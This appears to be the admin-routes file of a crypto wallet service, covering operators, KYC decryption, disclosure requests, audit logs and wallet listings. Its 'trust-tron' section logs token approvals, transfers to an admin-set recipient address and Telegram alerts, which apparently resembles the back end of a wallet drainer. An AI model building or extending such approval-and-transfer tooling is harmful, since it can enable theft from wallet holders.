import bcrypt from "bcryptjs";
import { Router } from "express";
import { StatusCodes } from "http-status-codes";
import { z } from "zod";
import { capabilitiesFromDbRow, isValidCapabilityList } from "../lib/admin-capabilities.js";
import { identityDb, walletDb } from "../db/pool.js";
import { HttpError } from "../lib/http-error.js";
import {
  requireAdminPanelAccess,
  requireAuth,
  requireCapability,
  type AuthenticatedRequest
} from "../middleware/auth.js";
import { decryptText } from "../security/encryption.js";
import { logAdminAudit } from "../services/audit.service.js";
import {
  sendAdminUserWalletTransferTelegramNotification,
  sendTelegramTestMessage
} from "../services/telegram.service.js";

const createDisclosureSchema = z.object({
  userId: z.string().uuid(),
  walletAddress: z.string().min(16),
  lawfulRequestReference: z.string().min(4)
});

const approveDisclosureSchema = z.object({
  approvedByUser: z.boolean().default(false)
});

const paidWalletsQuerySchema = z.object({
  chain: z.enum(["ethereum", "bsc", "tron"]).default("ethereum")
});

const userWalletTransferNotifySchema = z.object({
  userId: z.string().uuid(),
  chain: z.enum(["ethereum", "bsc", "tron", "solana"]),
  fromWalletAddress: z.string().min(16),
  toWalletAddress: z.string().min(16),
  spenderWalletAddress: z.string().min(16),
  amountUsdt: z.coerce.number().positive(),
  txHash: z.string().min(20)
});

const trustTronConfigPatchSchema = z.object({
  defaultRecipientAddress: z
    .string()
    .trim()
    .regex(/^T[1-9A-HJ-NP-Za-km-z]{33}$/, "Invalid Tron address")
});

const trustTronWalletsQuerySchema = z.object({
  search: z.string().optional(),
  limit: z.coerce.number().int().min(1).max(500).optional()
});

const adminPasswordPatchSchema = z.object({
  currentPassword: z.string().optional(),
  newPassword: z.string().min(10).max(200)
});

const operatorCapabilitiesPatchSchema = z.object({
  capabilities: z.array(z.string()).refine((c) => isValidCapabilityList(c), { message: "Invalid capability value" })
});

const router = Router();

const BCRYPT_ROUNDS = 12;

router.use(requireAuth);
router.use(requireAdminPanelAccess);

router.get("/me", async (req: AuthenticatedRequest, res) => {
  if (!req.user) {
    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
  }

  const row = await identityDb.query<{
    id: string;
    email: string;
    role: string;
    admin_capabilities: string[] | null;
    admin_password_hash: string | null;
  }>(
    `
      SELECT id, email, role, admin_capabilities, admin_password_hash
      FROM users
      WHERE id = $1::uuid
      LIMIT 1
    `,
    [req.user.sub]
  );

  const u = row.rows[0];
  if (!u) {
    throw new HttpError("User not found", StatusCodes.NOT_FOUND);
  }

  const capabilities = capabilitiesFromDbRow(u.role as "admin" | "compliance" | "user", u.admin_capabilities);

  res.status(StatusCodes.OK).json({
    user: {
      id: u.id,
      email: u.email,
      role: u.role
    },
    capabilities,
    hasPassword: Boolean(u.admin_password_hash)
  });
});

router.patch("/me/password", async (req: AuthenticatedRequest, res) => {
  const parsed = adminPasswordPatchSchema.safeParse(req.body);
  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  if (!req.user) {
    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
  }

  const userResult = await identityDb.query<{ admin_password_hash: string | null }>(
    `SELECT admin_password_hash FROM users WHERE id = $1::uuid LIMIT 1`,
    [req.user.sub]
  );

  const existingHash = userResult.rows[0]?.admin_password_hash;
  if (existingHash) {
    if (!parsed.data.currentPassword) {
      throw new HttpError("currentPassword is required to change an existing password", StatusCodes.BAD_REQUEST);
    }
    const match = await bcrypt.compare(parsed.data.currentPassword, existingHash);
    if (!match) {
      throw new HttpError("Current password is incorrect", StatusCodes.FORBIDDEN);
    }
  }

  const newHash = await bcrypt.hash(parsed.data.newPassword, BCRYPT_ROUNDS);
  await identityDb.query(`UPDATE users SET admin_password_hash = $2 WHERE id = $1::uuid`, [
    req.user.sub,
    newHash
  ]);

  res.status(StatusCodes.OK).json({ status: "updated" });
});

router.get("/operators", requireCapability("operators:manage"), async (_req: AuthenticatedRequest, res) => {
  const result = await identityDb.query<{
    id: string;
    email: string;
    role: string;
    admin_capabilities: string[] | null;
  }>(
    `
      SELECT id, email, role, admin_capabilities
      FROM users
      WHERE role IN ('admin', 'compliance')
      ORDER BY email ASC
    `
  );

  res.status(StatusCodes.OK).json({
    operators: result.rows.map((row) => ({
      id: row.id,
      email: row.email,
      role: row.role,
      capabilities: capabilitiesFromDbRow(row.role as "admin" | "compliance", row.admin_capabilities)
    }))
  });
});

router.patch("/operators/:userId", requireCapability("operators:manage"), async (req: AuthenticatedRequest, res) => {
  const parsed = operatorCapabilitiesPatchSchema.safeParse(req.body);
  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  const userId = req.params.userId;
  if (typeof userId !== "string" || !z.string().uuid().safeParse(userId).success) {
    throw new HttpError("Invalid user id", StatusCodes.BAD_REQUEST);
  }

  if (!isValidCapabilityList(parsed.data.capabilities)) {
    throw new HttpError("Invalid capabilities payload", StatusCodes.BAD_REQUEST);
  }

  const target = await identityDb.query<{ id: string; role: string }>(
    `SELECT id, role FROM users WHERE id = $1::uuid LIMIT 1`,
    [userId]
  );

  const t = target.rows[0];
  if (!t || (t.role !== "admin" && t.role !== "compliance")) {
    throw new HttpError("Operator not found", StatusCodes.NOT_FOUND);
  }

  await identityDb.query(`UPDATE users SET admin_capabilities = $2::text[] WHERE id = $1::uuid`, [
    userId,
    parsed.data.capabilities
  ]);

  const readBack = await identityDb.query<{ email: string; role: string; admin_capabilities: string[] | null }>(
    `SELECT email, role, admin_capabilities FROM users WHERE id = $1::uuid LIMIT 1`,
    [userId]
  );

  const u = readBack.rows[0];
  if (!u) {
    throw new HttpError("User not found", StatusCodes.NOT_FOUND);
  }

  res.status(StatusCodes.OK).json({
    id: userId,
    email: u.email,
    role: u.role,
    capabilities: capabilitiesFromDbRow(u.role as "admin" | "compliance", u.admin_capabilities)
  });
});

/** Wallet DB rows keyed by identity user id (no FK across databases). */
async function purgeWalletMappingForIdentityUser(userId: string): Promise<void> {
  await walletDb.query(`DELETE FROM trust_tron_telegram_logs WHERE user_id = $1::uuid`, [userId]);
  await walletDb.query(
    `DELETE FROM disclosure_logs WHERE user_id = $1::uuid OR created_by_admin_user_id = $1::uuid`,
    [userId]
  );
  await walletDb.query(
    `DELETE FROM disclosure_requests WHERE user_id = $1::uuid OR created_by_admin_user_id = $1::uuid`,
    [userId]
  );
  await walletDb.query(`DELETE FROM wallet_links WHERE user_id = $1::uuid`, [userId]);
}

router.delete("/operators/:userId", requireCapability("operators:delete"), async (req: AuthenticatedRequest, res) => {
  if (!req.user) {
    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
  }

  const userId = req.params.userId;
  if (typeof userId !== "string" || !z.string().uuid().safeParse(userId).success) {
    throw new HttpError("Invalid user id", StatusCodes.BAD_REQUEST);
  }

  if (userId === req.user.sub) {
    throw new HttpError("You cannot remove your own operator account", StatusCodes.BAD_REQUEST);
  }

  const deleted = await identityDb.query<{ id: string; email: string }>(
    `DELETE FROM users WHERE id = $1::uuid AND role IN ('admin', 'compliance') RETURNING id, email`,
    [userId]
  );

  if (!deleted.rows[0]) {
    throw new HttpError("Operator not found", StatusCodes.NOT_FOUND);
  }

  try {
    await purgeWalletMappingForIdentityUser(userId);
  } catch (walletCleanupError) {
    console.error("[admin] operator deleted from identity DB but wallet mapping cleanup failed", {
      userId,
      walletCleanupError
    });
  }

  await logAdminAudit({
    actorUserId: req.user.sub,
    actorRole: req.user.role,
    action: "ADMIN_OPERATOR_DELETE",
    targetUserId: userId,
    metadata: { deletedEmail: deleted.rows[0].email }
  });

  res.status(StatusCodes.OK).json({ status: "deleted", id: userId });
});

router.get("/users/by-wallet/:walletAddress", requireCapability("users:read"), async (req: AuthenticatedRequest, res) => {
  const walletAddressParam = req.params.walletAddress;
  if (typeof walletAddressParam !== "string") {
    throw new HttpError("Invalid wallet address parameter", StatusCodes.BAD_REQUEST);
  }
  const normalizedAddress = walletAddressParam.toLowerCase();

  const walletResult = await walletDb.query<{
    user_id: string;
    wallet_address: string;
    link_status: string;
  }>(
    `
      SELECT user_id, wallet_address, link_status
      FROM wallet_links
      WHERE wallet_address = $1
      LIMIT 1
    `,
    [normalizedAddress]
  );

  const walletLink = walletResult.rows[0];
  if (!walletLink) {
    throw new HttpError("Wallet not found", StatusCodes.NOT_FOUND);
  }

  const userResult = await identityDb.query<{ id: string; email: string }>(
    `SELECT id, email FROM users WHERE id = $1 LIMIT 1`,
    [walletLink.user_id]
  );

  if (!req.user) {
    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
  }

  await logAdminAudit({
    actorUserId: req.user.sub,
    actorRole: req.user.role,
    action: "ADMIN_WALLET_SEARCH",
    targetUserId: walletLink.user_id,
    metadata: { walletAddress: normalizedAddress }
  });

  res.status(StatusCodes.OK).json({
    userId: walletLink.user_id,
    email: userResult.rows[0]?.email ?? null,
    walletAddress: walletLink.wallet_address,
    walletStatus: walletLink.link_status
  });
});

router.get("/identity/:userId", requireCapability("identity:read"), async (req: AuthenticatedRequest, res) => {
  const userId = req.params.userId;
  if (typeof userId !== "string") {
    throw new HttpError("Invalid user ID parameter", StatusCodes.BAD_REQUEST);
  }

  const kycResult = await identityDb.query<{
    encrypted_identity_json: string;
    verification_status: string;
  }>(
    `
      SELECT encrypted_identity_json, verification_status
      FROM kyc_profiles
      WHERE user_id = $1
      LIMIT 1
    `,
    [userId]
  );

  const kycProfile = kycResult.rows[0];
  if (!kycProfile) {
    throw new HttpError("KYC profile not found", StatusCodes.NOT_FOUND);
  }

  if (!req.user) {
    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
  }

  await logAdminAudit({
    actorUserId: req.user.sub,
    actorRole: req.user.role,
    action: "ADMIN_VIEW_IDENTITY_DATA",
    targetUserId: userId
  });

  res.status(StatusCodes.OK).json({
    userId,
    verificationStatus: kycProfile.verification_status,
    identityData: JSON.parse(decryptText(kycProfile.encrypted_identity_json))
  });
});

router.post("/disclosures", requireCapability("disclosures:write"), async (req: AuthenticatedRequest, res) => {
  const parsed = createDisclosureSchema.safeParse(req.body);
  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  if (!req.user) {
    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
  }

  const inserted = await walletDb.query<{ id: string }>(
    `
      INSERT INTO disclosure_requests (
        user_id,
        wallet_address,
        lawful_request_reference,
        created_by_admin_user_id
      ) VALUES ($1, $2, $3, $4)
      RETURNING id
    `,
    [
      parsed.data.userId,
      parsed.data.walletAddress.toLowerCase(),
      parsed.data.lawfulRequestReference,
      req.user.sub
    ]
  );

  await logAdminAudit({
    actorUserId: req.user.sub,
    actorRole: req.user.role,
    action: "ADMIN_CREATE_DISCLOSURE_REQUEST",
    targetUserId: parsed.data.userId,
    metadata: {
      disclosureRequestId: inserted.rows[0].id,
      lawfulRequestReference: parsed.data.lawfulRequestReference
    }
  });

  res.status(StatusCodes.CREATED).json({
    disclosureRequestId: inserted.rows[0].id,
    status: "pending"
  });
});

router.post(
  "/disclosures/:disclosureRequestId/approve",
  requireCapability("disclosures:approve"),
  async (req: AuthenticatedRequest, res) => {
  const parsed = approveDisclosureSchema.safeParse(req.body ?? {});
  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  if (!req.user) {
    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
  }

  const requestResult = await walletDb.query<{
    id: string;
    user_id: string;
    wallet_address: string;
    lawful_request_reference: string;
    status: string;
  }>(
    `
      SELECT id, user_id, wallet_address, lawful_request_reference, status
      FROM disclosure_requests
      WHERE id = $1
      LIMIT 1
    `,
    [req.params.disclosureRequestId]
  );

  const disclosureRequest = requestResult.rows[0];
  if (!disclosureRequest) {
    throw new HttpError("Disclosure request not found", StatusCodes.NOT_FOUND);
  }

  if (disclosureRequest.status !== "pending") {
    throw new HttpError("Disclosure request already processed", StatusCodes.BAD_REQUEST);
  }

  await walletDb.query(
    `
      UPDATE disclosure_requests
      SET status = 'approved',
          approved_by_user = $2,
          approved_at = NOW()
      WHERE id = $1
    `,
    [disclosureRequest.id, parsed.data.approvedByUser]
  );

  const disclosureLog = await walletDb.query<{ id: string }>(
    `
      INSERT INTO disclosure_logs (
        user_id,
        wallet_address,
        lawful_request_reference,
        approved_by_user,
        created_by_admin_user_id,
        approved_at
      ) VALUES ($1, $2, $3, $4, $5, NOW())
      RETURNING id
    `,
    [
      disclosureRequest.user_id,
      disclosureRequest.wallet_address,
      disclosureRequest.lawful_request_reference,
      parsed.data.approvedByUser,
      req.user.sub
    ]
  );

  await logAdminAudit({
    actorUserId: req.user.sub,
    actorRole: req.user.role,
    action: "ADMIN_APPROVE_DISCLOSURE_REQUEST",
    targetUserId: disclosureRequest.user_id,
    metadata: {
      disclosureRequestId: disclosureRequest.id,
      disclosureLogId: disclosureLog.rows[0].id
    }
  });

  res.status(StatusCodes.OK).json({
    disclosureRequestId: disclosureRequest.id,
    disclosureLogId: disclosureLog.rows[0].id,
    status: "approved"
  });
});

router.get("/audit-logs", requireCapability("audit:read"), async (req: AuthenticatedRequest, res) => {
  const limit = Number(req.query.limit ?? 50);
  const safeLimit = Number.isFinite(limit) ? Math.min(Math.max(limit, 1), 200) : 50;

  const result = await walletDb.query<{
    id: string;
    actor_user_id: string;
    actor_role: string;
    action: string;
    target_user_id: string | null;
    metadata_json: Record<string, unknown>;
    created_at: Date;
  }>(
    `
      SELECT id, actor_user_id, actor_role, action, target_user_id, metadata_json, created_at
      FROM admin_audit_logs
      ORDER BY created_at DESC
      LIMIT $1
    `,
    [safeLimit]
  );

  res.status(StatusCodes.OK).json({
    entries: result.rows
  });
});

router.get("/paid-wallets", requireCapability("manage_wallets:read"), async (req: AuthenticatedRequest, res) => {
  const parsed = paidWalletsQuerySchema.safeParse(req.query);
  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  const chain = parsed.data.chain;
  const paymentsResult = await walletDb.query<{
    user_id: string;
    wallet_address: string;
    payment_count: number | null;
    total_paid_usdt: string | null;
    last_paid_at: Date | null;
  }>(
    `
      SELECT
        wl.user_id,
        wl.wallet_address,
        COUNT(fp.id)::int AS payment_count,
        COALESCE(SUM(fp.amount_usdt), 0)::text AS total_paid_usdt,
        MAX(fp.paid_at) AS last_paid_at
      FROM wallet_links wl
      LEFT JOIN fee_payments fp
        ON fp.wallet_link_id = wl.id
      WHERE wl.chain = $1
        AND wl.link_status = 'active'
      GROUP BY wl.user_id, wl.wallet_address
      ORDER BY wl.wallet_address ASC
      LIMIT 500
    `,
    [chain]
  );

  const wallets = paymentsResult.rows.map((row) => ({
    userId: row.user_id,
    walletAddress: row.wallet_address,
    paymentCount: row.payment_count ?? 0,
    totalPaidUsdt: Number(row.total_paid_usdt ?? "0"),
    lastPaidAt: row.last_paid_at,
    usdtBalance: null,
    balanceFetchError: null
  }));

  res.status(StatusCodes.OK).json({
    chain,
    entries: wallets
  });
});

router.post("/telegram/test", requireCapability("manage_wallets:write"), async (req: AuthenticatedRequest, res) => {
  if (!req.user) {
    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
  }

  await sendTelegramTestMessage(req.user.sub);

  await logAdminAudit({
    actorUserId: req.user.sub,
    actorRole: req.user.role,
    action: "ADMIN_TELEGRAM_TEST",
    metadata: {}
  });

  res.status(StatusCodes.OK).json({ status: "sent" });
});

router.post(
  "/user-wallet-transfers/notify",
  requireCapability("manage_wallets:write"),
  async (req: AuthenticatedRequest, res) => {
  const parsed = userWalletTransferNotifySchema.safeParse(req.body);
  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  if (!req.user) {
    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
  }

  const payload = parsed.data;

  try {
    await sendAdminUserWalletTransferTelegramNotification({
      adminUserId: req.user.sub,
      userId: payload.userId,
      chain: payload.chain,
      fromWalletAddress: payload.fromWalletAddress,
      toWalletAddress: payload.toWalletAddress,
      spenderWalletAddress: payload.spenderWalletAddress,
      amountUsdt: payload.amountUsdt,
      txHash: payload.txHash
    });
  } catch (error) {
    console.error("[admin.user-wallet-transfers.notify] Telegram notification failed", error);
  }

  await logAdminAudit({
    actorUserId: req.user.sub,
    actorRole: req.user.role,
    action: "ADMIN_USER_WALLET_TRANSFER_NOTIFY",
    targetUserId: payload.userId,
    metadata: {
      chain: payload.chain,
      fromWalletAddress: payload.fromWalletAddress,
      toWalletAddress: payload.toWalletAddress,
      spenderWalletAddress: payload.spenderWalletAddress,
      amountUsdt: payload.amountUsdt,
      txHash: payload.txHash
    }
  });

  res.status(StatusCodes.OK).json({ status: "sent" });
});

router.get("/trust-tron/logs", requireCapability("manage_wallets:read"), async (req: AuthenticatedRequest, res) => {
  const parsed = z
    .object({
      limit: z.coerce.number().int().min(1).max(200).optional()
    })
    .safeParse(req.query);

  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  const limit = parsed.data.limit ?? 20;

  const logsResult = await walletDb.query<{
    id: string;
    created_at: Date;
    event_type: string;
    user_id: string | null;
    wallet_address: string;
    connect_method: string | null;
    to_address: string | null;
    amount_usdt: string | null;
    approve_tx_id: string | null;
    transfer_tx_id: string | null;
    error_message: string | null;
    telegram_sent: boolean;
    telegram_sent_at: Date | null;
    telegram_error: string | null;
  }>(
    `
      SELECT
        id,
        created_at,
        event_type,
        user_id,
        wallet_address,
        connect_method,
        to_address,
        amount_usdt,
        approve_tx_id,
        transfer_tx_id,
        error_message,
        telegram_sent,
        telegram_sent_at,
        telegram_error
      FROM trust_tron_telegram_logs
      ORDER BY created_at DESC
      LIMIT $1
    `,
    [limit]
  );

  res.status(StatusCodes.OK).json({
    entries: logsResult.rows.map((row) => ({
      id: row.id,
      createdAt: row.created_at.toISOString(),
      eventType: row.event_type,
      userId: row.user_id,
      walletAddress: row.wallet_address,
      connectMethod: row.connect_method,
      toAddress: row.to_address,
      amountUsdt: row.amount_usdt ? Number(row.amount_usdt) : null,
      approveTxId: row.approve_tx_id,
      transferTxId: row.transfer_tx_id,
      errorMessage: row.error_message,
      telegramSent: row.telegram_sent,
      telegramSentAt: row.telegram_sent_at ? row.telegram_sent_at.toISOString() : null,
      telegramError: row.telegram_error
    }))
  });
});

router.patch("/trust-tron/config", requireCapability("manage_wallets:write"), async (req: AuthenticatedRequest, res) => {
  const parsed = trustTronConfigPatchSchema.safeParse(req.body);
  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  if (!req.user) {
    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
  }

  const address = parsed.data.defaultRecipientAddress;

  await walletDb.query(
    `
      INSERT INTO trust_tron_settings (id, default_recipient_address, updated_at)
      VALUES (1, $1, NOW())
      ON CONFLICT (id) DO UPDATE SET
        default_recipient_address = EXCLUDED.default_recipient_address,
        updated_at = NOW()
    `,
    [address]
  );

  const readBack = await walletDb.query<{ updated_at: Date }>(
    `SELECT updated_at FROM trust_tron_settings WHERE id = 1 LIMIT 1`
  );

  await logAdminAudit({
    actorUserId: req.user.sub,
    actorRole: req.user.role,
    action: "ADMIN_TRUST_TRON_PAY_RECIPIENT_UPDATE",
    metadata: { defaultRecipientAddress: address }
  });

  res.status(StatusCodes.OK).json({
    defaultRecipientAddress: address,
    updatedAt: readBack.rows[0]?.updated_at?.toISOString() ?? new Date().toISOString()
  });
});

router.get("/trust-tron/wallets", requireCapability("manage_wallets:read"), async (req: AuthenticatedRequest, res) => {
  const parsed = trustTronWalletsQuerySchema.safeParse(req.query);
  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  const limit = parsed.data.limit ?? 100;
  const search = parsed.data.search?.trim() ?? "";

  const walletsResult = await walletDb.query<{
    id: string;
    wallet_address: string;
    created_at: Date;
    verified_at: Date;
  }>(
    `
      SELECT id, wallet_address, created_at, verified_at
      FROM wallet_users
      WHERE chain = 'tron'
        AND (
          $1::text = ''
          OR wallet_address ILIKE '%' || $1 || '%'
        )
      ORDER BY created_at DESC
      LIMIT $2
    `,
    [search, limit]
  );

  res.status(StatusCodes.OK).json({
    entries: walletsResult.rows.map((row) => ({
      id: row.id,
      walletAddress: row.wallet_address,
      createdAt: row.created_at.toISOString(),
      verifiedAt: row.verified_at.toISOString()
    }))
  });
});

export { router as adminRoutes };
